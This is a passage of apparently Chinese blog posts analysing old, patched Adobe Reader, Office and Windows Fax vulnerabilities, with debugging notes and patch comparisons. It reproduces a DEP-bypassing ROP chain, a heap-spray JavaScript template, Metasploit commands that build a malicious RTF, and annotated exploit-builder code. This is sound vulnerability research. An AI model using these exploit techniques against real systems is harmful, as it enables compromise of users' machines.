[esp+ebx*2],edi#   jne check_slash# ret_one:#   mov al,1#   ret# check_slash:#   cmp al,0x2f#   je ret_one#   cmp al,0x41#   jl check_lower#   cmp al,0x5a#   jle check_ptr# check_lower:#   cmp al,0x61#   jl ret_zero#   cmp al,0x7a#   jg ret_zero#   cmp [ecx+1],0x3a#   je ret_one# ret_zero:#   xor al,al#   ret#0x4a80a8a6,   # execute fun block0x4a801f90,   # pop eax / ret0x4a849038,   # becomes eax (import for CreateFileMappingA)# -- call CreateFileMappingA0x4a80b692,   # jmp [eax]0x4a801064,   # ret0xffffffff,   # arguments to CreateFileMappingA, hFile0x00000000,   # lpAttributes0x00000040,   # flProtect0x00000000,   # dwMaximumSizeHigh0x00010000,   # dwMaximumSizeLow0x00000000,   # lpName0x4a8063a5,   # pop ecx / ret0x4a801064,   # becomes ecx0x4a842db2,   # xchg eax,edi / ret0x4a802ab1,   # pop ebx / ret0x00000008,   # becomes ebx - offset to modify0x4a80a8a6,   # execute fun block0x4a801f90,   # pop eax / ret0x4a849030,   # becomes eax (import for MapViewOfFile)# -- call MapViewOfFile0x4a80b692,   # jmp [eax]0x4a801064,   # ret0xffffffff,   # args to MapViewOfFile - hFileMappingObject0x00000022,   # dwDesiredAccess0x00000000,   # dwFileOffsetHigh0x00000000,   # dwFileOffsetLow0x00010000,   # dwNumberOfBytesToMap0x4a8063a5,   # pop ecx / ret0x4a8a0004,   # becomes ecx - writable pointer0x4a802196,   # mov [ecx],eax / ret - save map base addr0x4a8063a5,   # pop ecx / ret0x4a801064,   # becomes ecx - ptr to ret0x4a842db2,   # xchg eax,edi / ret0x4a802ab1,   # pop ebx / ret0x00000030,   # becomes ebx - offset to modify0x4a80a8a6,   # execute fun block0x4a801f90,   # pop eax / ret0x4a8a0004,   # becomes eax - saved file mapping ptr0x4a80a7d8,   # mov eax,[eax] / ret - load saved mapping ptr0x4a8063a5,   # pop ecx / ret0x4a801064,   # becomes ecx - ptr to ret0x4a842db2,   # xchg eax,edi / ret0x4a802ab1,   # pop ebx / ret0x00000020,   # becomes ebx - offset to modify0x4a80a8a6,   # execute fun block0x4a8063a5,   # pop ecx / ret0x4a801064,   # becomes ecx - ptr to ret0x4a80aedc,   # lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret0x4a801f90,   # pop eax / ret0x00000034,   # becomes eax0x4a80d585,   # add eax,edx / ret0x4a8063a5,   # pop ecx / ret0x4a801064,   # becomes ecx - ptr to ret0x4a842db2,   # xchg eax,edi / ret0x4a802ab1,   # pop ebx / ret0x0000000a,   # becomes ebx - offset to modify0x4a80a8a6,   # execute fun block0x4a801f90,   # pop eax / ret0x4a849170,   # becomes eax (import for memcpy)# -- call memcpy0x4a80b692,   # jmp [eax]0xffffffff,   # this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy0xffffffff,   # becomes first arg to memcpy (dst)0xffffffff,   # becomes second arg to memcpy (src)0x00001000,   # becomes third arg to memcpy (length)#0x0000258b,   # ??#0x4d4d4a8a,   # ??\n\n这段 payload 同样包含了一条 ROP 链，且其中的 ROP Gadget 均位于未开启 ASLR 的 icucnv36.dll 库中，其执行内容为调用四个函数，分别是\n\nCreateFileA 创建一个文件或设备，payload 创建了一个名为iso88591的文件，且该文件可读可写可执行\nCreateFileMappingA 创建文件映射内核对象，文件与物理页映射，payload 将创建的文件映射到了物理内存地址\nMapViewOfFile 将一个文件映射对象映射到当前应用程序的地址空间。payload 将创建的文件映射到了程序所处的虚拟内存地址空间\nmemcpy 将源地址的内容复制到目的地址，payload 将 0x1000 字节\n\n即通过前三个函数创建一个可读可写的内存段，并将 shellcode 复制到该内存段中，进而绕过 DEP 执行 shellcode。在这之后，exp 创建了一段 JavaScrip 代码，并将上述 payload 及 shellcode 封装到了 JS 代码中，其中\npayload_buf = &#x27;&#x27;payload_buf &lt;&lt; stack_datapayload_buf &lt;&lt; encoded_payloadescaped_payload = Rex::Text.to_unescape(payload_buf)var_unescape  = rand_text_alpha(rand(100) + 1)var_shellcode = rand_text_alpha(rand(100) + 1)var_start     = rand_text_alpha(rand(100) + 1)var_s         = 0x10000var_c         = rand_text_alpha(rand(100) + 1)var_b         = rand_text_alpha(rand(100) + 1)var_d         = rand_text_alpha(rand(100) + 1)var_3         = rand_text_alpha(rand(100) + 1)var_i         = rand_text_alpha(rand(100) + 1)var_4         = rand_text_alpha(rand(100) + 1)\n\n用于封装 payload 的格式化 JS 代码为\n// 重命名函数var #&#123;var_unescape&#125; = unescape;// 编码 payloadvar #&#123;var_shellcode&#125; = #&#123;var_unescape&#125;( &#x27;#&#123;escaped_payload&#125;&#x27; );var #&#123;var_c&#125; = #&#123;var_unescape&#125;( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );// 不断拼接 #&#123;var_c&#125; 确保其足够大while (#&#123;var_c&#125;.length + 20 + 8 &lt; #&#123;var_s&#125;) #&#123;var_c&#125;+=#&#123;var_c&#125;;#&#123;var_b&#125; = #&#123;var_c&#125;.substring(0, (0x0c0c-0x24)/2);// 拼接 shellcode 到  #&#123;var_b&#125; 的末尾#&#123;var_b&#125; += #&#123;var_shellcode&#125;;// 拼接 #&#123;var_c&#125; 到  #&#123;var_b&#125; 的末尾#&#123;var_b&#125; += #&#123;var_c&#125;;#&#123;var_d&#125; = #&#123;var_b&#125;.substring(0, #&#123;var_s&#125;/2);// 不断拼接 #&#123;var_d&#125; 确保其足够大while(#&#123;var_d&#125;.length &lt; 0x80000) #&#123;var_d&#125; += #&#123;var_d&#125;;#&#123;var_3&#125; = #&#123;var_d&#125;.substring(0, 0x80000 - (0x1020-0x08) / 2);var #&#123;var_4&#125; = new Array();// Heap Sprayfor (#&#123;var_i&#125;=0;#&#123;var_i&#125;&lt;0x1f0;#&#123;var_i&#125;++) #&#123;var_4&#125;[#&#123;var_i&#125;]=#&#123;var_3&#125;+&quot;s&quot;;\n\n填充后的 JS 代码和 TTF 文件一同被封装到木马 PDF 文件中，并被传播给攻击目标\n漏洞修复Adobe Reader v9.4.0 修复了这个漏洞，其中 CoolType.dll 从 v5.5.72.1 更新到了 v5.5.73.1，区别在于 strcat 函数加入了长度检查，令人感慨\nReferenceNVD - CVE-2010-2883CVE - CVE-2010-2883漏洞战争Adobe Official Document没有比我更详细的CVE-2010-2883分析了TTF DocumentSING Table Definitionsp4n9x’s Blog2010.09.09 - VUPEN - Criminals Are Getting Smarter: Analysis of the Adobe Acrobat&#x2F;Reader 0-Day Exploit\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2010-3333 漏洞研究","url":"/2024/07/17/Vulnerability%20Investigation/CVE-2010-3333-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"Microsoft Office 是微软发布的非常流行的办公软件套件。CVE-2010-3333(微软编号：MS10-087)是 MicrosoftOffice XP SP3、Office 2003 SP3、Office 2007 SP2、Office 2010，MacOffice 2004 和 Office 2008，MacOffice 2011 和 Mac 的 Open XML 文件格式转换器中的栈溢出漏洞。主要是在处理 RTF 中的 pFragments 属性时存在栈溢出，导致攻击者可以借助特制的 RTF 数据执行任意代码，因此该漏洞又名“RTF栈缓冲区溢出漏洞”\n影响范围：Microsoft Office XP SP3, Office 2003 SP3, Office 2007 SP2, Office 2010, Office 2004 and 2008 forMac, Office for Mac 2011\n\n\nRTF 文件RTF（Rich Text Format）是 Microsoft 为进行文本和图像信息格式的交换而制定的一种文件格式，它适用于不同的设备、操作环境和操作系统。RTF 文件只能包含 7 位 ASCII 字符，但可以通过转义序列对超出 ASCII 范围的字符进行编码。一个 RTF 文件包含了控制字(Control Word)、控制符(Control Symbol)、群组(Group)和正文(Text)等基本元素。其中，控制字是 RTF 用来标记打印控制符和管理文档信息的一种特殊格式的命令，也是正文格式的控制代码，每个控制字均以一个反斜杠\\开头，由 a-z 小写字母组成，通常应该不包含任何大写字母，并由分隔符作为其名称的结束，其使用格式为\\\\[a-z]+&lt;分隔符&gt;（正则）；控制符号由反斜杠后跟一个单独的非字母字符，表示一个特定符号；群组由包含在大括号中的文本、控制字或控制符组成，每个组包含文本和文本的不同属性。\n\n控制字的名称不能超过32个字母，且最初是不包含任何大写字母的，但是近年来，一些较新的控制字会由大写字母组成。因此其使用格式的正则表达式可重新书写为\\\\[a-zA-Z]+&lt;分隔符&gt;。此处的分隔符可以是一个空格，一个数字，一个 ASCII 减号甚至是除数字和字母外的任何字符\n\n一个完整的 RTF 文件将包含文件头和文档区两大部分，可通过下列语法表示\n&lt;File&gt; &#x27;&#123;&#x27; &lt;header&gt; &lt;document&gt; &#x27;&#125;&#x27;\n\n通过微软官方文档的目录可以了解到文件头和文档区各自所包含的数据\nContents of an RTF file    Header        RTF Version        Character Set        Unicode RTF        Default Fonts and Languages        Theme Data        Color Scheme Mapping        Font Table        File Table        Color Table        Default Properties        Style Sheet        List Tables        Paragraph Group Properties        Revision Marks        User Protection Information    Document Area        Information Group        Read-Only Password Protection        XML Namespace Table        Document Formatting Properties        Mail Merge        Section Text        Paragraph Text        Mathematics        Character Text        Document Variables        Bookmarks        Protection Exceptions        Pictures        Custom XML Tags        Objects        Drawing Objects        Footnotes        Comments (Annotations)        Fields        Index Entries        Table of Contents Entries        Bidirectional Language Support\n\n需要注意的是文档区存在 Drawing Objects 数据，这意味着 RTF 文件可以插入图形。图形对象的主体被定义为一系列属性。控制字\\shp…后面跟着\\*\\shpinst，然后是一个形状的所有属性列表，其中&#123; \\sp &#123; \\sn .......... &#125; &#123; \\sp .............. &#125; &#125;是这个图形的属性组，sp 是 shape properties 的缩写，sn 表示属性名称，sv 表示属性值。图形在 RTF 文件中的格式如下\n&#123; \\shp   ........  &#123; \\*\\shpinst  &#123; \\sp  &#123; \\sn .......... &#125;  &#123; \\sv .............. &#125;  &#125;  &#125;            &#123; \\shprslt   ............... &#125;   &#125;\n\n图形的属性组中存在着一个属性叫做 pFragments，它是一个数组结构，表示图形的可选附加部分，列出了图形的所有碎片\n\n该漏洞的成因正是 Open XML 文件格式转换器在处理 RTF 中的 pFragments 属性值时，没有正确计算属性值占用的空间大小进而产生了栈溢出漏洞\n\n漏洞分析调试 MSF 生成的 exp 样本进行漏洞复现会发现 Word 打开木马 RTF 文件后执行到\nrep movs dword ptr es:[edi],dword ptr [esi]\n\n指令后抛出异常并中断了，该指令为循环拷贝指令。查看 edi 寄存器内的拷贝目标内存地址，发现该内存区域禁止读写，因此出现 segmentation fault 而触发异常。通过抛出异常的指令的内存地址初步判断漏洞代码位于 MSO.DLL 库，使用 IDA 分析该库\nMSO.DLL 文件 meta 数据如下\nFile Name   : MSO.DLLFormat      : Portable executable for 80386 (PE)Imagebase   : 30C90000Timestamp   : 46771B00 (Mon Jun 18 23:53:36 2007)Section 1. (virtual address 00001000)Virtual size                  : 00977A59 (9927257.)Section size in file          : 00977C00 (9927680.)Offset to raw data for section: 00000400Flags 60000020: Text Executable ReadableAlignment     : defaultImports from ADVAPI32.dll\n\n由于操作系统与软件所处年代较早，MSO.DLL 几乎没有采用任何防御机制，例如能通过反汇编代码看出它没有开启 GS ，其 IMAGE_OPTIONAL_HEADER 中的 DllCharacteristics 字段未设置 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 标志，因此它也没开启 DEP，甚至哪怕 MOS.DLL 开启了 DEP 但 Windows XP SP3 也不支持该保护，除此之外 SafeSEH，ControlFlowGuard 等保护也未开启，唯一开启的保护机制是 Word 的 ASLR 而非 MOS.DLL 的（Windows XP 只支持 PEB、TEB 的 ASLR，不支持映像的 ASLR，即 MOS.DLL 的加载基址不会发生改变）。因此漏洞利用时可采用包括但不限于 SEH 与 ROP 在内的攻击手段去写入 shellcode\n采用栈回溯（Stack Backtrace）的漏洞分析方式，查看程序崩溃时的函数调用栈，将断点下到抛出异常的指令所属的函数的主调函数处，观察程序行为后定位到的漏洞代码如下\n.text:30ED4406                               ; void __stdcall sub_30ED4406(int, void *, int).text:30ED4406                               sub_30ED4406 proc near                  ; DATA XREF: .text:30DA33F4↑o.text:30ED4406.text:30ED4406                               arg_0= dword ptr  4.text:30ED4406                               arg_4= dword ptr  8.text:30ED4406                               arg_8= dword ptr  0Ch.text:30ED4406.text:30ED4406 57                            push    edi.text:30ED4407 8B 7C 24 0C                   mov     edi, [esp+4+arg_4].text:30ED440B 85 FF                         test    edi, edi.text:30ED440D 74 27                         jz      short loc_30ED4436.text:30ED440D.text:30ED440F 8B 44 24 08                   mov     eax, [esp+4+arg_0].text:30ED4413 8B 48 08                      mov     ecx, [eax+8].text:30ED4416 81 E1 FF FF 00 00             and     ecx, 0FFFFh.text:30ED441C 56                            push    esi.text:30ED441D 8B F1                         mov     esi, ecx.text:30ED441F 0F AF 74 24 14                imul    esi, [esp+8+arg_8].text:30ED4424 03 70 10                      add     esi, [eax+10h].text:30ED4427 8B C1                         mov     eax, ecx.text:30ED4429 C1 E9 02                      shr     ecx, 2.text:30ED442C F3 A5                         rep movsd.text:30ED442E 8B C8                         mov     ecx, eax.text:30ED4430 83 E1 03                      and     ecx, 3.text:30ED4433 F3 A4                         rep movsb.text:30ED4435 5E                            pop     esi.text:30ED4435.text:30ED4436.text:30ED4436                               loc_30ED4436:                           ; CODE XREF: sub_30ED4406+7↑j.text:30ED4436 5F                            pop     edi.text:30ED4437 C2 0C 00                      retn    0Ch.text:30ED4437.text:30ED4437                               sub_30ED4406 endp\n\n反编译\nvoid __stdcall sub_30ED4406(int a1, void *a2, int a3)&#123;  if ( a2 )    qmemcpy(      a2,      (const void *)(*(_DWORD *)(a1 + 16) + a3 * (unsigned __int16)*(_DWORD *)(a1 + 8)),      (unsigned __int16)*(_DWORD *)(a1 + 8));&#125;\n\n可以发现该漏洞为没有检测 memcopy 的数据长度导致的栈溢出\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search CVE-2010-3333\n\n搜索结果\nMatching Modules================   #  Name      Disclosure Date  Rank   Check  Description   -  ----      ---------------  ----   -----  -----------   0  exploit/windows/fileformat/ms10_087_rtf_pfragments_bof      2010-11-09       great  No     MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)   1    \\_ target: Automatic      .                .      .      .   2    \\_ target: Microsoft Office 2002 SP3 English on Windows XP SP3 English     .                .      .      .   3    \\_ target: Microsoft Office 2003 SP3 English on Windows XP SP3 English     .                .      .      .   4    \\_ target: Microsoft Office 2007 SP0 English on Windows XP SP3 English     .                .      .      .   5    \\_ target: Microsoft Office 2007 SP0 English on Windows Vista SP0 English  .                .      .      .   6    \\_ target: Microsoft Office 2007 SP0 English on Windows 7 SP0 English      .                .      .      .   7    \\_ target: Crash Target for Debugging      .                .      .      .Interact with a module by name or index. For example info 7, use 7 or use exploit/windows/fileformat/ms10_087_rtf_pfragments_bofAfter interacting with a module you can manually set a TARGET with set TARGET &#x27;Crash Target for Debugging&#x27;\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bofmsf6 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; info\n\n模块详情信息\n       Name: MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)     Module: exploit/windows/fileformat/ms10_087_rtf_pfragments_bof   Platform: Windows       Arch: Privileged: No    License: Metasploit Framework License (BSD)       Rank: Great  Disclosed: 2010-11-09Provided by:  wushi of team509  unknown  jduck &lt;jduck@metasploit.com&gt;  DJ Manila Ice, Vesh, CAAvailable targets:      Id  Name      --  ----  =&gt;  0   Automatic      1   Microsoft Office 2002 SP3 English on Windows XP SP3 English      2   Microsoft Office 2003 SP3 English on Windows XP SP3 English      3   Microsoft Office 2007 SP0 English on Windows XP SP3 English      4   Microsoft Office 2007 SP0 English on Windows Vista SP0 English      5   Microsoft Office 2007 SP0 English on Windows 7 SP0 English      6   Crash Target for DebuggingCheck supported:  NoBasic options:  Name      Current Setting  Required  Description  ----      ---------------  --------  -----------  FILENAME  msf.rtf          yes       The file name.Payload information:  Space: 512  Avoid: 1 charactersDescription:  This module exploits a stack-based buffer overflow in the handling of the  &#x27;pFragments&#x27; shape property within the Microsoft Word RTF parser. All versions  of Microsoft Office 2010, 2007, 2003, and XP prior to the release of the  MS10-087 bulletin are vulnerable.  This module does not attempt to exploit the vulnerability via Microsoft Outlook.  The Microsoft Word RTF parser was only used by default in versions of Microsoft  Word itself prior to Office 2007. With the release of Office 2007, Microsoft  began using the Word RTF parser, by default, to handle rich-text messages within  Outlook as well. It was possible to configure Outlook 2003 and earlier to use  the Microsoft Word engine too, but it was not a default setting.  It appears as though Microsoft Office 2000 is not vulnerable. It is unlikely that  Microsoft will confirm or deny this since Office 2000 has reached its support  cycle end-of-life.References:  https://nvd.nist.gov/vuln/detail/CVE-2010-3333  OSVDB (69085)  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2010/MS10-087  http://www.securityfocus.com/bid/44652  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=880View the full module info with the info -d command.\n\n使用该模块生成木马 RTF 文件\nmsf6 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; set target 0msf6 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; set FILENAME Crash.rtfmsf6 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; set payload windows/exec msf6 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; set CMD calc.exemsf6 exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit\n\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/fileformat/ms10_087_rtf_pfragments_bof.rb\n\nExp 的内容为\nclass MetasploitModule &lt; Msf::Exploit::Remote    Rank = GreatRanking    include Msf::Exploit::FILEFORMAT    include Msf::Exploit::Seh    #* 注册模块元数据信息的初始化函数    def initialize(info = &#123;&#125;)        super(update_info(info,            &#x27;Name&#x27;           =&gt; &#x27;MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)&#x27;,            &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,            &#x27;License&#x27;        =&gt; MSF_LICENSE,            &#x27;Author&#x27;         =&gt; ...,            &#x27;References&#x27;     =&gt; ...,            &#x27;DefaultOptions&#x27; =&gt; ...,            &#x27;Payload&#x27;        =&gt; ...,            &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,            &#x27;Targets&#x27;        =&gt; ...,            &#x27;DisclosureDate&#x27; =&gt; &#x27;2010-11-09&#x27;,            &#x27;DefaultTarget&#x27; =&gt; 0))        register_options(...)    end    def add_target(rest, targ)        ...    end    def exploit        ...    end    def sz_rand    #* 生成一个不是 0，2，4，8 之一的 0 到 8 的随机数         bad_sizes = [ 0, 2, 4, 8 ]        x = rand(9)        while bad_sizes.include? x        x = rand(9)        end        x    endend\n\n其中与实际漏洞利用密切相关的两个函数的具体执行流为\ndef add_target(rest, targ)#* 将生成的 SEH 记录和跳转指令插入到指定的偏移位置以构建 exploit    targ[&#x27;Offsets&#x27;].each &#123; |off|    seh = generate_seh_record(targ.ret)    rest[off, seh.length] = seh    distance = off + seh.length    jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, &quot;jmp $-&quot; + distance.to_s).encode_string    rest[off + seh.length, jmp_back.length] = jmp_back    &#125;enddef exploit    # Prepare a sample SEH frame and backward jmp for length calculations    #* 生成一个 SEH 记录    seh = generate_seh_record(0xdeadbeef)    #* 生成跳回用的跳转指令    jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, &quot;jmp $-0xffff&quot;).encode_string    # RTF property Array parameters    #* 生成随机数以作为 RTF 文件的属性参数    el_size = sz_rand()    el_count = sz_rand()    data = &#x27;&#x27;    # These words are presumably incorrectly used    # assert(amount1 &lt;= amount2)    data &lt;&lt; [0x1111].pack(&#x27;v&#x27;) * 2    data &lt;&lt; [0xc8ac].pack(&#x27;v&#x27;)    # Filler    if target.name =~ /Debug/i    rest = Rex::Text.pattern_create(0x10000 + seh.length + jmp_back.length)    else    len = 51200 + rand(1000)    rest = rand_text(len + seh.length + jmp_back.length)    rest[0, payload.encoded.length] = payload.encoded    end    # Stick fake SEH frames here and there ;)    if target.name == &quot;Automatic&quot;    targets.each &#123; |t|        next if t.name !~ /Windows/i        add_target(rest, t)    &#125;    else    add_target(rest, target)    end    # Craft the array for the property value    #* 拼接 payload 和填充的数据    sploit = &quot;%d;%d;&quot; % [el_size, el_count]    sploit &lt;&lt; data.unpack(&#x27;H*&#x27;).first    sploit &lt;&lt; rest.unpack(&#x27;H*&#x27;).first    # Assemble it all into a nice RTF    #* 将 payload 包装进 RTF 文件    content  = &quot;&#123;\\\\rtf1&quot;    content &lt;&lt; &quot;&#123;\\\\shp&quot;             # shape    content &lt;&lt; &quot;&#123;\\\\sp&quot;              # shape property    content &lt;&lt; &quot;&#123;\\\\sn pFragments&#125;&quot;  # property name    content &lt;&lt; &quot;&#123;\\\\sv #&#123;sploit&#125;&#125;&quot;   # property value    content &lt;&lt; &quot;&#125;&quot;    content &lt;&lt; &quot;&#125;&quot;    content &lt;&lt; &quot;&#125;&quot;    print_status(&quot;Creating &#x27;#&#123;datastore[&#x27;FILENAME&#x27;]&#125;&#x27; file ...&quot;)    file_create(content)end\n\n其具体执行方式如下图所示（转自Sp4n9x的博客）\n\nMSF 生成的 Exp 选择了采取较为典型的基于 SEH 的攻击手段写入 Shellcode，如漏洞分析部分所言也可以通过 ROP 技术达到相同的效果，在此不过多赘述\n漏洞修复由于该漏洞较为久远且 Microsoft 的网站发生了很大改变，现在很难找得到当时的补丁。作为替代，在此转述Sp4n9x漏洞复现博客的漏洞修复部分\n\n之前分析漏洞原因时，关键漏洞函数位于“12.0.4518.1014”版mso.dll的sub_32E5955E函数中，通过函数名，我们可以在Matched Functions中快速定位，找到之后，双击，就可以打开“12.0.4518.1014”版mso.dll的sub_32E5955E函数与“12.0.6545.5004”版mso.dll中的对应函数sub_32E0239B的FlowGraphs。通过对比代码块，我们可以快速定位到添加补丁代码的位置。下图是两个函数代码块的对比图：\n\n我们在IDA中找到多出来的那部分代码块，对其进行详细分析。结果如下：\n//补丁前关键函数关键代码char __userpurge sub_32E5955E@&lt;al&gt;(int a1@&lt;eax&gt;, int a2, int a3, int a4, int *a5, int a6)&#123;    ......    if ( a6 )    &#123;        v7 = *(_DWORD *)(sub_327A2549(*(_DWORD *)(a1 + 8)) + 100);        v17 = 0;        v8 = *(_DWORD *)v7;        v16 = 83886080;        (*(void (__stdcall **)(int, int *, int))(v8 + 28))(v7, &amp;v15, a3);        result = sub_32E5941B(v15, a2, a5 != 0 ? (unsigned int)&amp;v17 : 0, a6);        if ( result )        &#123;            ......        &#125;    &#125;    else    &#123;        sub_32E6AEA8(863334498);        result = 0;    &#125;    return result;&#125;//补丁后关键函数关键代码char __userpurge sub_32E0239B@&lt;al&gt;(int a1@&lt;eax&gt;, int a2, int a3, int a4, int *a5, int a6)&#123;    ......    if ( a6 )    &#123;        v7 = *(_DWORD *)(sub_327DAFBD(*(_DWORD *)(a1 + 8)) + 100);// v7为关键对象首地址        v16 = 0;        v15 = 83886080;        // 这些条件则为补丁代码        if ( v7                                     // 关键对象首地址不为0            &amp;&amp; (unsigned int)(*(int (__stdcall **)(int))(*(_DWORD *)v7 + 48))(v7) &lt;= 4// 复制数据长度不能大于4            &amp;&amp; (*(int (__stdcall **)(int))(*(_DWORD *)v7 + 44))(v7) &gt; a4// 关键对象第一个成员变量&gt;a4            &amp;&amp; (*(int (__stdcall **)(int))(*(_DWORD *)v7 + 44))(v7) &gt; a3// 关键对象第一个成员变量&gt;a3            &amp;&amp; a3 &gt;= 0            &amp;&amp; a4 &gt;= 0            // 将pFragments属性数据复制到栈上的虚函数            &amp;&amp; ((*(void (__stdcall **)(int, int *, int))(*(_DWORD *)v7 + 28))(v7, &amp;v14, a3),            (unsigned __int8)sub_32E02258(v14, a2, a5 != 0 ? (unsigned int)&amp;v16 : 0, a6)) )        &#123;            ......        &#125;        else        &#123;            result = 0;        &#125;    &#125;    else    &#123;        sub_32E197A4(863334498);        result = 0;    &#125;    return result;&#125;\n\n可以看到补丁后的关键函数中只有满足了那个关键if中的很多条件才能执行到将pFragments属性数据复制到栈上的虚函数。因为涉及到了很多虚函数，只是静态分析是不行的，所以要结合动态调试确定虚函数的地址，进而分析虚函数的功能。功能我已经分析完，写在了上面代码的注释中。其中第一个条件就是判断pFragments属性数据长度的。如果pFragments属性数据大于4字节，则不再执行内存复制，直接返回，从而解决了此漏洞。\n\nReferenceNVD - CVE-2010-3333CVE - CVE-2010-3333漏洞战争sp4n9x’blog\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2010-3974 漏洞研究","url":"/2025/02/02/Vulnerability%20Investigation/CVE-2010-3974%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"Microsoft Windows Cover Page 在 Windows 中主要用于个性化传真及呈现更正式外观的传真传输，当使用 Microsoft Windows Fax Cover Page Editor 打开特制的 .cov 传真封面文件时，会因为解析错误导致 double free 漏洞，进而允许任意代码执行。\n影响范围：\nMicrosoft Windows Server 2003 SP2Microsoft Windows Server 2008 Gold, SP2, R2, R2 SP1Microsoft Windows XP SP2, SP3Microsoft Windows Vista SP1 and SP2Microsoft Windows 7 Gold, SP1\n漏洞分析开启 ust 和 hfc，调试运行 fxscover.exe 并打开样本后程序因触发 Break Instruction 异常而崩溃。崩溃位置位于 ntdll!RtlReportCriticalFailure，显然这不是问题发生的第一现场。栈回溯得到函数调用关系\nFXSCOVER!CDrawDoc::DeleteContents+0xc-&gt; FXSCOVER!CDrawDoc::Remove+0x96-&gt; FXSCOVER!CDrawRoundRect::`scalar deleting destructor&#x27;-&gt; msvcrt!free+0xcd-&gt; ntdll!RtlFreeHeap+0x142-&gt; ntdll!RtlpFreeHeap-&gt; ntdll!RtlpAnalyzeHeapFailure-&gt; ntdll!RtlpLogHeapFailure-&gt; ntdll!RtlReportCriticalFailure\n\n参考漏洞描述，或者说由于已知漏洞的成因是 double free，可以先在 msvcrt!free 函数处下一个条件断点，随后再次打开样本使程序崩溃。查看条件断点的输出历史，发现崩溃前最后一次 free 时的 esi 寄存器值出现了两次。当然更直接的验证程序漏洞成因的方法是在 msvcrt!free 函数及其主调函数处下断点，随后跟进执行至 msvcrt!free 函数并通过 !heap -p -a 指令查看此时的 esi 所指向的堆块。其结果符合预期，state 为 free。\n由于 msvcrt!free 函数的主调函数是一个对象的析构方法，IDA 里找虚函数找的我有点头大，该漏洞的分析方法就参照《漏洞战争》一书进行补丁分析而非直接逆向分析的方式定位漏洞成因。事实上通过补丁分析漏洞是实际的漏洞分析手段中最实用的方法。\n下载 Windows 7 MS11-024 补丁并使用 IDA 和 BinDiff 进行补丁比较，发现只有三个函数发生了修改。分别是 CDrawPoly::Serialize(CArchive &amp;), CDrawDoc::Serialize(CArchive &amp;) 和 CDrawText::GetText(int, int)。参照之前的分析结果，看向 CDrawDoc::Serialize(CArchive &amp;) 函数，发现该函数 patch 后新增了一段代码，其反编译结果如下\nwhile ( 1 )&#123;  v6 = v9[0];  if ( !v9[0] )    break;  v8 = 0;  v7 = *CPtrList::GetNext((CDrawDoc *)((char *)this + 160), v9);  if ( v7 )  &#123;    v11 = CDrawDoc::IsObjectAlreadySerialized(this, v7, v11, &amp;v8);    if ( !v8 )      continue;  &#125;  CObList::RemoveAt((CDrawDoc *)((char *)this + 160), v6);&#125;postorder_deletion(v11);\n\n这段代码会遍历 CPtrList 中的 CDrawDoc 对象指针，判断其指向对象是否被序列化，如果未被序列化，就从列表中移除索引到的对象。因此推测 unpatched fxscover.exe 的漏洞成因为 CPtrList 中存在未被序列化的 CDrawDoc 对象指针，且该对象指针指向了一块已被 free 的内存区域，导致它在后续执行流程中被移除时造成 double free\n\n当然也可能是检测索引到的对象指针，若其指向的目标已经被序列化则移除，未序列化则保留。这种情况下序列化后的对象将会被 free，因此未被移除的已被序列化的对象在后续执行流程中再次被序列化造成 double free\n\n漏洞利用MSF 中未搜索到该漏洞的 exp，按照《漏洞战争》的说法其 exp 被公布并收录在了 exploit-db 上，可惜我去查阅的时候发现它已经被删除了。不过根据分析结果来看，这个漏洞为攻击者提供的可操作空间是比较大的，例如程序在调用 MFC42u!CObject::IsKindOf 函数时会引用已释放的内存，并取其对应的内存值作为虚表指针索引并调用虚函数。故该漏洞完全可以用于堆喷，并在拿到虚函数表基址时用于劫持控制流，跳转到 ROP 链或 shellcode。应该是比较典型的该类型漏洞利用方式，在此不再赘述\n漏洞修复如漏洞分析部分所言，补丁添加了一段根据索引目标指向对象序列化与否移除 CDrawDoc 对象指针的代码修复了该漏洞\nReferenceGithub - CVE-2010-3974Microsoft 安全公告 MS11-024 - 重要NVD - CVE-2010-3974CVE - CVE-2010-3974漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2011-0104 漏洞研究","url":"/2024/08/08/Vulnerability%20Investigation/CVE-2011-0104-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"CVE-2011-0104 是 Microsoft Excel 在解析 XLB 文件中的 TOOLBARDEF Record ————CVE 公告上写的是 Hlink Record，但事实上是 TOOLBARDEF Record————时未对 Len 和 Cbtn 字段与 Continue Record 的 Len 字段做过滤导致导致栈溢出漏洞，这允许攻击者能够借此实现任意地址写任意数据。通过让受害者打开恶意的 XLB 文件，攻击者能够完全控制受害者主机。到目前为止 CVE-2011-0104 漏洞还未收录在 MSF 中\n影响范围：Microsoft Office XP SP3, Office 2003 SP3, Office 2007 SP2, Office 2010, Office 2004 